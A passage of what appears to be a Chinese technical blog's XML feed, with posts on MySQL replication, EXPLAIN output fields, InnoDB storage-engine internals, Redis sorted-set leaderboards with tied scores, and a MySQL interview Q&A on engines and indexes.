class="headerlink" title="复制的工作原理"></a>复制的工作原理</h4><p>异步同步，并非完全的主从同步。</p><ol><li>主服务器把数据更新记录到二进制日志中。</li><li>从服务器把主服务器的二进制日志拷贝到自己的中继日志（relay log)中。</li><li>从服务器重做中继日志中的事件，把更新应用到自己的数据库上。</li></ol><p><img src="https://img-blog.csdnimg.cn/20200505105757299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="复制不仅限于备份"><a href="#复制不仅限于备份" class="headerlink" title="复制不仅限于备份"></a>复制不仅限于备份</h4><ol><li><p>数据分布</p><p>不同数据中心之间实现数据拷贝。</p></li><li><p>读取的负载均衡</p><p>读写分离。</p></li><li><p>数据库备份</p><p>从服务器不是备份，不能完全代替备份。</p></li><li><p>高可用性和故障转移</p><p>减少故障的停机时间和恢复时间。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-主从同步原理</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ul><li><h4 id="Replication-线程"><a href="#Replication-线程" class="headerlink" title="Replication 线程"></a>Replication 线程</h4></li></ul><ol><li>master与slave之间实现整个复制过程主要由三个线程完成：两个（SQL线程和IO线程）在slave端，一个（IO线程）在master端。</li><li>要实现MySQL的replication，必须打开master端的Binary Log(mysql-bin.xxx)功能。</li><li>整个复制过程实际上就是slave从master端获取日志然后在自己身上<strong>顺序执行</strong>日志中记录的各种操作。</li></ol><ul><li><h4 id="复制基本过程（异步的）"><a href="#复制基本过程（异步的）" class="headerlink" title="复制基本过程（异步的）"></a>复制基本过程（异步的）</h4></li></ul><ol><li>slave上的IO线程连接master，请求从指定日志文件的指定位置（或者从最开始）之后的日志内容。 </li><li>master收到请求，负责复制的IO根据请求信息读取指定的日志，并返回（日志文件的地址也返回，方便下次直接根据地址请求）</li><li>slave的IO收到信息后，将日志内容依次写入到slave端的relay log文件的最末端，存master日志文件的地址。</li><li>slave的SQL线程检测到Relay Log中新加内容后，马上解析该Log文件的内容（Query语句），从而能保证两端的数据是一样的。</li></ol><ul><li><h4 id="MySQL半同步模式"><a href="#MySQL半同步模式" class="headerlink" title="MySQL半同步模式"></a>MySQL半同步模式</h4></li></ul><ol><li>在这种模式下：master会等到binlog<strong>成功传送并写入至少一个slave的relay log之后才会提交</strong>，否则一直等待，直到timeout（默认10s）。当出现timeout的时候，master会自动切换半同步为异步，<strong>直到至少有一个slave成功收到并发送Acknowledge，master会再切换回半同步模式</strong>。结合这个新功能，我们可以做到，在允许损失一定的事务吞吐量的前提下来保证同步数据的绝对安全，因为当你设置timeout为一个足够大的值的情况下，任何提交的数据都会安全抵达slave。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-Explain字段含义</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-Explain%E5%AD%97%E6%AE%B5%E5%90%AB%E4%B9%89/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-Explain%E5%AD%97%E6%AE%B5%E5%90%AB%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql-explain用法和结果的含义"><a href="#mysql-explain用法和结果的含义" class="headerlink" title="mysql explain用法和结果的含义"></a><a href="https://www.cnblogs.com/yycc/p/7338894.html">mysql explain用法和结果的含义</a></h1><h3 id="explain或desc显示了mysql如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。"><a href="#explain或desc显示了mysql如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。" class="headerlink" title="explain或desc显示了mysql如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。"></a>explain或desc显示了mysql如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。</h3><blockquote><p>explain 数据表 或 desc 数据表</p><p>显示数据表各字段含义</p></blockquote><blockquote><p>explain sql 或desc sql</p><p>显示sql执行效率</p></blockquote><h3 id="explain列解释"><a href="#explain列解释" class="headerlink" title="explain列解释"></a>explain列解释</h3><ol><li><p>==table== 输出的行所引用的表</p></li><li><p>==select_type== select类型</p><blockquote><ul><li><strong>SIMPLE</strong>:简单SELECT(不使用UNION或子查询)</li><li><strong>PRIMARY</strong>:最外面的SELECT</li><li><strong>UNION</strong>:UNION中的第二个或后面的SELECT语句</li><li><strong>DEPENDENT UNION</strong>:UNION中的第二个或后面的SELECT语句,取决于外面的查询</li><li><strong>UNION RESULT</strong>:UNION 的结果</li><li><strong>SUBQUERY</strong>:子查询中的第一个SELECT</li><li><strong>DEPENDENT SUBQUERY</strong>:子查询中的第一个SELECT,取决于外面的查询</li><li><strong>DERIVED</strong>:导出表的SELECT(FROM子句的子查询)</li></ul></blockquote></li><li><p>==type== 这是重要的列，显示连接使用了何种类型。</p><blockquote><p>结果值从好到坏依次是：</p><p>system &gt; const &gt; eq_ref &gt; ref &gt; fulltext &gt; ref_or_null &gt; index_merge &gt; unique_subquery &gt; index_subquery &gt; range &gt; index &gt; ALL</p><ul><li><strong>system</strong>:表仅有一行(=系统表)。这是const联接类型的一个特例。</li><li><strong>const</strong>:表最多有一个匹配行,它将在查询开始时被读取。因为仅有一行,在这行的列值可被优化器剩余部分认为是常数。const表很快,因为它们只读取一次!</li><li><strong>eq_ref</strong>:对于每个来自于前面的表的行组合,从该表中读取一行。这可能是最好的联接类型,除了const类型。</li><li><strong>ref</strong>:对于每个来自于前面的表的行组合,所有有匹配索引值的行将从这张表中读取。</li><li><strong>ref_or_null</strong>:该联接类型如同ref,但是添加了MySQL可以专门搜索包含NULL值的行。</li><li><strong>index_merge</strong>:该联接类型表示使用了索引合并优化方法。</li><li><strong>unique_subquery</strong>:该类型替换了下面形式的IN子查询的ref: value IN (SELECT primary_key FROM single_table WHERE some_expr) unique_subquery是一个索引查找函数,可以完全替换子查询,效率更高。</li><li><strong>index_subquery</strong>:该联接类型类似于unique_subquery。可以替换IN子查询,但只适合下列形式的子查询中的非唯一索引: value IN (SELECT key_column FROM single_table WHERE some_expr)</li><li><strong>range</strong>:只检索给定范围的行,使用一个索引来选择行。</li><li><strong>index</strong>:该联接类型与ALL相同,除了只有索引树被扫描。这通常比ALL快,因为索引文件通常比数据文件小。</li><li><strong>ALL</strong>:对于每个来自于先前的表的行组合,进行完整的表扫描。</li></ul></blockquote></li><li><p>==possible_keys== 指出MySQL能使用哪个索引在该表中找到行。</p></li><li><p>==key== 实际使用的索引。如果为NULL，则没有使用索引。很少的情况下，MYSQL会选择优化不足的索引。</p><blockquote><p>可以在SELECT语句中使用USE INDEX（indexname）、force index(indexname) 来强制使用一个索引或者用IGNORE INDEX（indexname）来强制MYSQL忽略索引</p></blockquote></li><li><p>==key_len== 使用的索引的长度。在不损失精确性的情况下，长度越短越好。如果键是NULL,则长度为NULL。</p></li><li><p>==ref== 显示使用哪个列或常数与key一起从表中选择行。</p></li><li><p>==rows== MYSQL认为必须检查的用来返回请求数据的行数。</p></li><li><p>==extra== 关于MYSQL如何解析查询的额外信息。</p><blockquote><p>坏的例子是<strong>Using temporary</strong>和<strong>Using filesort</strong>，意思MYSQL根本不能使用索引，结果是检索会很慢。</p><ul><li>distinct: 一旦MYSQL找到了与行相联合匹配的行，就不再搜索了。</li><li>not exists: MYSQL优化了LEFT JOIN，一旦它找到了匹配LEFT JOIN标准的行，就不再搜索了。</li><li>range checked for each Record（index map:#）:MySQL没有发现好的可以使用的索引,但发现如果来自前面的表的列值已知,可能部分索引可以使用。这是使用索引的最慢的连接之一。</li><li><strong>using filesort</strong>: 看到这个的时候，查询就需要优化了。<strong>MYSQL需要进行额外的步骤来发现如何对返回的行排序</strong>。它根据连接类型以及存储排序键值和匹配条件的全部行的行指针来排序全部行。</li><li>using index: 从只使用索引树中的信息而不需要进一步搜索读取实际的行来检索表中的列信息。</li><li>using temporary 看到这个的时候，查询需要优化了。为了解决查询,MySQL需要创建一个临时表来容纳结果。这通常发生在对不同的列集进行ORDER BY上，而不是GROUP BY上。</li><li>where used 使用了WHERE从句来限制哪些行将与下一张表匹配或者是返回给用户。如果不想返回表中的全部行，并且连接类型ALL或index，这就会发生，或者是查询有问题不同连接类型的解释（按照效率高低的顺序排序）</li><li>system 表只有一行：system表。这是const连接类型的特殊情况。</li><li>const 表中的一个记录的最大值能够匹配这个查询（索引可以是主键或惟一索引）。因为只有一行，这个值实际就是常数，因为MYSQL先读这个值然后把它当做常数来对待。</li><li>eq_ref 在连接中，MYSQL在查询时，从前面的表中，对每一个记录的联合都从表中读取一个记录，它在查询使用了索引为主键或惟一键的全部时使用。</li><li>ref 这个连接类型只有在查询使用了不是惟一或主键的键或者是这些类型的部分（比如，利用最左边前缀）时发生。对于之前的表的每一个行联合，全部记录都将从表中读出。这个类型严重依赖于根据索引匹配的记录多少—越少越好。</li><li>range 这个连接类型使用索引返回一个范围中的行，比如使用&gt;或&lt;查找东西时发生的情况。</li><li>index 这个连接类型对前面的表中的每一个记录联合进行完全扫描（比ALL更好，因为索引一般小于表数据）。</li><li>ALL 这个连接类型对于前面的每一个记录联合进行完全扫描，这一般比较糟糕，应该尽量避免。</li></ul></blockquote></li><li><p>==filtered== 显示了通过条件过滤出的行数的百分比估计值。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-InnoDB存储引擎</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-InnoDB%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-InnoDB%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/</url>
      
        <content type="html"><![CDATA[<h3 id="InnoDB引擎的4大特性"><a href="#InnoDB引擎的4大特性" class="headerlink" title="InnoDB引擎的4大特性"></a>InnoDB引擎的4大特性</h3><ol><li><p>插入缓存（物理页的一个组成部分）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show engine innodb status\G;</span><br><span class="line">INSERT BUFFER AND ADAPTIVE HASH INDEX # 插入缓冲信息</span><br></pre></td></tr></tbody></table></figure><p>对于非聚集索引的插入或更新操作，不是每次直接插入索引页。而是先判断插入的非聚集索引页是否在缓冲池中。如果在，则直接插入，如果不在，先放入插入缓冲区，然后再以一定的频率执行插入缓冲和非聚集索引页子节点的合并操作。</p><blockquote><p>那什么时候进行合并呢？</p><ul><li>非聚集索引页被读取到缓冲池中。select先检查insert buffer是否有非聚集索引页的存在，如果有则合并。</li><li>非聚集索引页没有可用空间。空间小于1/32页的大小，则进行合并。</li><li>master thread每秒和每10秒的合并操作。</li></ul></blockquote><p>这样通常能将多个插入合并到一个操作中，目的还是为了减少随机IO带来性能损耗。</p><p>使用需要满足两个条件</p><ul><li>索引是非聚集索引</li><li>索引不是唯一索引的</li></ul></li><li><p>两次写 double write</p><p>二次写缓存位于系统表空间，用来缓存从buffer poll中flush之后，写入数据文件之前的数据。数据页到double write以一次大的连续块的方式写入，需要的IO消耗小于写入数据文件的消耗。</p><blockquote><p>double write的组成：</p><ul><li><p>内存中double write buffer，大小为2M。</p></li><li><p>物理磁盘上共享表空间中连续的128个页，即两个区，大小为2M。</p></li></ul></blockquote><p>对缓冲池中的脏页进行刷新时，不是直接写磁盘，而是将脏页先复制到内存中的double write buffer，之后通过double write分两次，每次1M顺序的写入共享表空间的物理磁盘上。因为double write页是连续的，顺序写的开销很小。在完成double write页的写入后，再将double write buffer 中的页写入各个表空间文件中。这时的写入是离散的，如果在写入过程中出现崩溃，可以使用共享表空间的double write页进行恢复。</p></li><li><p>自适应哈希索引</p><p>InnoDB会监控对表上索引的查找，如果建立哈希索引可以带来速度的提升，则建立哈希索引。自适应哈希索引通过缓冲池的B+树构造，因此建立速度很快。</p><p>哈希索引会根据访问的频率和模式为==某些页建==立哈希索引，而不是整个表。</p><p>自适应哈希索引占用InnoDB buffer poll的空间。</p></li><li><p>预读</p><ul><li><p>随机预读（已废弃）</p><p>当一个区中==13==个页在缓冲区中，并在LRU列表的前端，则InnoDB存储引擎会将这个区中剩余的所有页都预读到缓冲区。InnoDB Plugin 1.0.4开始，随机预读被取消。</p></li><li><p>线性预读</p><p>基于缓冲池中页的访问模式，而不是数量。如果一个区中的N个页都被顺序的访问了，则InnoDB会读取下一个区的所有页。N的值由<code>innodb_read_ahead_threshold</code>控制，默认值56。</p></li></ul></li></ol><h3 id="InnoDB体系架构"><a href="#InnoDB体系架构" class="headerlink" title="InnoDB体系架构"></a>InnoDB体系架构</h3><p><img src="https://img-blog.csdnimg.cn/20200504133348713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="后台线程"><a href="#后台线程" class="headerlink" title="后台线程"></a>后台线程</h4><p>默认情况下InnoDB后台有7个线程（版本不同，线程数可能不同；线程数也可以配置）</p><ol><li><p>1个master thread（几乎实现了所有功能）</p></li><li><p>1个锁监控线程</p></li><li><p>1个错误监控线程</p></li><li><p>4个I/O thread（不同版本read write线程数可能不同）</p><blockquote><p>Insert  buffer thread</p><p>Log thread</p><p>Read thread</p><p>Write  thread</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show engine innodb status\G; # 过去某个时间段的数据库状态</span><br><span class="line"></span><br><span class="line">Per second averages calculated from the last 46 seconds # 过去46s内的状态</span><br><span class="line"></span><br><span class="line">FILE I/O</span><br><span class="line">xxx</span><br></pre></td></tr></tbody></table></figure></blockquote></li></ol><h4 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h4><ol><li><p>缓冲池 buffer poll</p><p>占最大块内存，InnoDB将数据库文件按页（16k）读到缓冲池，然后按LRU保留缓存数据。数据库文件需要修改，首先修改缓冲池中的页（发生修改后，该页为脏页），按照一定的频率将缓冲池中的脏页刷新到文件。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show engine innodb status\G;</span><br><span class="line"></span><br><span class="line">BUFFER POOL AND MEMORY</span><br><span class="line">Buffer pool size   8191 # 一共多少个缓冲帧</span><br><span class="line">Free buffers       7529 # 空闲缓冲帧</span><br><span class="line">Database pages     658 # 已经使用缓冲帧</span><br><span class="line">Old database pages 262</span><br><span class="line">Modified db pages  0 # 脏页数量</span><br></pre></td></tr></tbody></table></figure><ul><li>缓冲池中的数据页类型<ol><li>索引页</li><li>数据页</li><li>undo页</li><li>插入缓冲 insert buffer</li><li>自适应hash索引</li><li>InnoDB锁信息 lock info</li><li>数据字典信息 data dictionary</li></ol></li></ul></li><li><p>重做日志缓冲池 redo log buffer</p></li><li><p>额外内存池 additional memory poll</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-SortedSet排行榜同分</title>
      <link href="/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-SortedSet%E6%8E%92%E8%A1%8C%E6%A6%9C%E5%90%8C%E5%88%86/"/>
      <url>/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-SortedSet%E6%8E%92%E8%A1%8C%E6%A6%9C%E5%90%8C%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h4 id="排行榜可以使用SortedSet，但是如果同分的时候会有两种相对难搞的情况："><a href="#排行榜可以使用SortedSet，但是如果同分的时候会有两种相对难搞的情况：" class="headerlink" title="排行榜可以使用SortedSet，但是如果同分的时候会有两种相对难搞的情况："></a>排行榜可以使用SortedSet，但是如果同分的时候会有两种相对难搞的情况：</h4><ol><li>谁排名靠前，按需求展示。</li><li>同分名次并列。</li></ol><h4 id="同分不同名"><a href="#同分不同名" class="headerlink" title="同分不同名"></a>同分不同名</h4><p>SortedSet score支持浮点数，只要给每个score加上对应的小数，就能实现按先后达到目标值的排序进行展示。</p><blockquote><p>如 1/timestamp 或 1/(时间戳最大值-timestamp)，这里可能有精度问题注意一下。</p></blockquote><h4 id="同分同名次"><a href="#同分同名次" class="headerlink" title="同分同名次"></a>同分同名次</h4><p>这时一个SortedSet 就不能满足需求了，因为不知道前面有多少个同分的成员。</p><ul><li><p>两个SortedSet，一个Hash<br>A SortedSet 放所有排名信息 member score<br>B SortedSet 放不重复的分数排名 member和score都用A中的score<br>C Hash记录 score 及 该分数成员的数量</p></li><li><p>数据更新<br>分数增加或减少<br>1.检查C key中原分数下成员的数量，并减1，如果数量为0，删除在 B key中对应分数；检查新的分数是否已经在B key中，如果没有，加进去。<br>2.C key新的分数下团的数量加1。<br>3.A key正常增加分数。</p></li><li><p>存在的问题：<br>两次分页请求可能存在排名变化，导致获取的数据重复的丢失的情况。</p></li><li><p>解决方案：<br>如果不能接受两次请求间排名变化导致的数据误差，可以给榜单做快照，请求时将快照编号带给服务端来解决。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql面试100问</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E9%9D%A2%E8%AF%95100%E9%97%AE/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E9%9D%A2%E8%AF%95100%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<h5 id="面试官：“了解MySQL吗？”"><a href="#面试官：“了解MySQL吗？”" class="headerlink" title="面试官：“了解MySQL吗？”"></a>面试官：“了解MySQL吗？”</h5><p>要是说不了解，接下来该聊些啥呀？</p><h5 id="面试官：“了解的话，那说说XXX吧。”"><a href="#面试官：“了解的话，那说说XXX吧。”" class="headerlink" title="面试官：“了解的话，那说说XXX吧。”"></a>面试官：“了解的话，那说说XXX吧。”</h5><p>巴拉巴拉…</p><h3 id="MySQL有哪些常见的引擎，说说他们的区别？"><a href="#MySQL有哪些常见的引擎，说说他们的区别？" class="headerlink" title="MySQL有哪些常见的引擎，说说他们的区别？"></a>MySQL有哪些常见的引擎，说说他们的区别？</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show engines; #查看支持的引擎</span><br></pre></td></tr></tbody></table></figure><ul><li><p>MyISAM：非事务处理存储引擎</p><p>索引放在XX.MYI文件中，数据放在XX.MYD文件中。</p></li><li><p>InnoDB：具备外键功能的存储引擎</p><p>索引也是数据。数据和索引存在一个XX.IDB文件中。</p></li><li><p>Mermory：基于内存</p><p>Memory表至少比MyISAM表要快一个数量级，因为所有的数据都保存在内存中，不需要进行磁盘I/O。Memory表的结构在重启以后还会保留，但数据会丢失。</p></li><li><p>Archive：数据存档，数据插入后不能修改</p><p>针对高写入压缩做了优化的简单引擎。</p><table><thead><tr><th>特点</th><th>InnoDB</th><th>MyISAM</th><th>Memory</th><th>Archive</th></tr></thead><tbody><tr><td>b+树索引</td><td>yes</td><td>yes</td><td>yes</td><td>no</td></tr><tr><td>MVCC</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>事务</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>存储限制</td><td>64TB</td><td>256TB</td><td>RAM</td><td>None</td></tr><tr><td>索引缓存</td><td>yes</td><td>yes</td><td>本身就是缓存</td><td>No</td></tr><tr><td>外键</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>锁粒度</td><td>row</td><td>table</td><td>table</td><td>row</td></tr><tr><td>全文索引</td><td>yes</td><td>yes</td><td>no</td><td>no</td></tr><tr><td>数据缓存</td><td>yes</td><td>no</td><td>本身就是缓存</td><td>no</td></tr></tbody></table></li></ul><h3 id="有哪些索引和他们之间的区别？"><a href="#有哪些索引和他们之间的区别？" class="headerlink" title="有哪些索引和他们之间的区别？"></a>有哪些索引和他们之间的区别？</h3><ul><li><h5 id="Hash索引"><a href="#Hash索引" class="headerlink" title="Hash索引"></a>Hash索引</h5><p>优点：</p><ol><li>Hash索引的检索可以一次到位，所以Hash索引的查询效率更高。</li></ol><p>缺点：</p><ol><li>Hash索引只能满足”=”，”IN”，”!=”，不能使用范围查询。</li><li>Hash值的大小关系不一定个原键值一样，不能做排序操作。</li><li>联合索引中不能利用部分索引键查询。</li><li>遇到大量Hash值相等的情况后，性能不一定比B树高。</li><li>存储引擎会为Hash索引中的每一列都计算hash码，Hash索引中存储的即hash码，所以每次读取都会进行两次查询。</li></ol><p>InnoDB引擎有一个特殊功能叫“自适应哈希索引”。当InnoDB发现某些索引值被使用的非常频繁是，会在内存中基于B-Tree索引之上再建一个哈希索引，这样可以让B-Tree索引具有哈希索引的优点。这是一个==完全自动的、内部的行为==，用户无法控制或配置（如果有必要，可以关闭该功能）。</p></li><li><h5 id="B-树索引"><a href="#B-树索引" class="headerlink" title="B+树索引"></a>B+树索引</h5><p>优点：</p><ol><li><p>所有索引数据都在叶子结点上，并且增加了顺序访问指针,每个叶子节点都有指向相邻叶子节点的指针。</p></li><li><p>利用了磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次I/O就可以完全载入。</p></li><li><p><strong>B-Tree中一次检索最多需要h-1次I/O（根节点常驻内存），渐进复杂度为O(h)=O(logdN)。</strong></p><p>假设叶子节点页可以存放100条记录，内部节点可以存放1000条目录，则</p><p>h=1，最多能放100条记录。</p><p>h=2，最多能放1000*100=100000条记录。</p><p>h=3，最多能放1000*1000*100=100000000（一亿）条记录。</p><p>h=4，最多能放1000*1000*1000*100=100000000000（一千亿）条记录，应该不会有这种数据量的表吧！</p><p>那为什么是O(logdN)呢？因为在页内查找一条记录时，使用的是==二分查找==。</p></li></ol></li><li><h5 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h5><ol><li>5.6版本之后InnoDB存储引擎开始支持全文索引，5.7版本之后通过使用ngram插件开始支持中文。</li><li>底层实现为倒排索引。</li></ol></li></ul><hr><ul><li><h5 id="聚集索引（聚簇索引）"><a href="#聚集索引（聚簇索引）" class="headerlink" title="聚集索引（聚簇索引）"></a>聚集索引（聚簇索引）</h5><ol><li><p>表数据按照索引的顺序存储，也就是说索引项的顺序和表中记录的物理顺序一致。</p></li><li><p>聚簇索引叶子节点存储了真实的数据行，不在有单独的数据页。</p></li><li><p>一张表只能创建一个聚簇索引，因为物理存储顺序只能有一种。<strong>聚簇集</strong>指的是数据行和相关的键值都保存在一起。</p></li><li><p>如果主键不是自增ID，MySQL会不断的调整数据的物理地址、分页分裂、页合并。如果自增，只需要一页一页的写，索引结构相对紧凑，磁盘碎片少，效率高。</p></li><li><p>聚簇索引不是人为创建的，默认就有。</p><p><img src="https://img-blog.csdnimg.cn/20200419175724907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol></li><li><h4 id="非聚集索引（二级索引）"><a href="#非聚集索引（二级索引）" class="headerlink" title="非聚集索引（二级索引）"></a>非聚集索引（二级索引）</h4><ol><li><p>表数据存储顺序与索引顺序无关。叶子节点包含索引字段值及指向数据页数据行的逻辑指针（行的主键值）。</p></li><li><p>适当建立联合索引（索引列包含全部查找列）能达到不用回表即可获取数据的目的。</p></li><li><p>为了保证B+树的同一层内节点的目录项记录除页号字段外是唯一的，内节点需要增加主键字段，即二级索引内节点由三部分组成：</p><blockquote><p>索引列的值</p><p>主键值</p><p>页号（页指针）</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020041917570460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol><hr></li><li><p>主键索引</p><ol><li>每张表都会有主键，也会用主键生成主键索引。</li><li>主键索引就是聚簇索引，因此建表时最好用自增类型主键。</li><li>如果没有设置主键会发生什么？建表时如果没有设置主键，MySQL会启用内部的隐藏主键==row_id==（6个字节），也就是说无论如何一张表都必须有主键。MySQL会依次查找<strong>主键-&gt;唯一键-&gt;隐藏主键</strong>建立索引。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table table_name add primary key (column name);</span><br></pre></td></tr></tbody></table></figure></li><li><p>普通索引，联合索引</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create index 索引名 on table_name(column1,column2);</span><br><span class="line">alter table table_name add index 索引名(column1,column2);</span><br></pre></td></tr></tbody></table></figure></li><li><p>唯一索引</p><ol><li>唯一索引可以有多个null（不提倡有null值）,但不能有重复的内容。</li><li>相比主键索引，主键字段不能为null，也不能重复。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create unique index index_name on table_name (column_list);</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="为什么要使用索引？"><a href="#为什么要使用索引？" class="headerlink" title="为什么要使用索引？"></a>为什么要使用索引？</h3><ol><li>减少存储引擎需要扫描的数据量，加快查询速度。</li><li>索引可以把随机I/O变为顺序I/O。</li><li>对索引结果进行排序以避免使用磁盘临时表。</li></ol><h3 id="建索引、使用索引要注意什么？"><a href="#建索引、使用索引要注意什么？" class="headerlink" title="建索引、使用索引要注意什么？"></a>建索引、使用索引要注意什么？</h3><ol><li>数据类型越小越好。数据类型越小，在磁盘、内存和CPU缓存中需要的空间更少，处理速度更快。</li><li>数据类型越简单越好。整形优于字符串，内置日期和时间优于字符串。</li><li>尽量避免NULL。</li><li>复合索引将最常用作限制条件的列放在最左边，依次递减。</li><li>复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。</li><li>短索引。对串列进行索引，如果可能应该指定一个前缀长度，不仅可以提高查询速度而且可以节省磁盘空间和I/O操作。</li><li>mysql查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。</li><li>建立索引的时候，可以加上nologging选项。以减少在建立索引过程中产生的大量redo，从而提高执行的速度。</li><li>建立索引的时候要对表进行加锁，因此应当注意操作在业务空闲的时候进行。</li><li>使用NOT IN和!=操作，mysql将无法使用索引。</li><li>不要在列上进行运算，where字句的查询条件里使用了函数将不会使用索引。</li></ol><h3 id="B-树有什么特点？为什么B-树更适合做索引？"><a href="#B-树有什么特点？为什么B-树更适合做索引？" class="headerlink" title="B+树有什么特点？为什么B+树更适合做索引？"></a>B+树有什么特点？为什么B+树更适合做索引？</h3><p>回答这个问题，心里一定要有点B树🐶。</p><ol><li><p>二叉查找树：</p><ul><li><p>左子树不为空，则左子树节点值均小于根节点。</p></li><li><p>右子树不为空，则右子树节点值均大于根节点。</p></li><li><p>任意节点的左右子树也是二叉查找树。</p></li><li><p>没有键值相同的节点。</p></li><li><p>有可能会退化成一条线性链。</p></li></ul></li><li><p>AVL树：</p><ul><li><p>AVL树是带有平衡条件的二叉查找树，一般用平衡因子差值判断是否平衡并通过旋转实现平衡。</p></li><li><p>左右子树高度差不超过1。</p></li><li><p>与红黑树相比，它是严格的平衡二叉树。</p></li><li><p>AVL树适合于插入删除比较少，但查找多的情况。</p></li></ul></li><li><p>红黑树：</p><ul><li>一种二叉查找树，每个节点增加一个存储位标识颜色。</li><li>通过对任何一条从根节点到叶子节点的路径上各个节点着色方式的限制，确保没有一条路径会比其他路径长出两倍。</li><li>是一种弱平衡二叉树，相对AVL树，它的旋转次数少，适用于搜索，插入，删除操作多的情况。</li></ul></li><li><p>B树（b-树）</p><ul><li>为了磁盘或其它存储设备而设计的一种平衡多路查找树。</li><li>与二叉树相比，每个节点有多个分支。在相同节点的情况下，高度远远低于红黑树。</li><li>B/B+树操作时间由磁盘存取和CPU两部分构成，CPU速度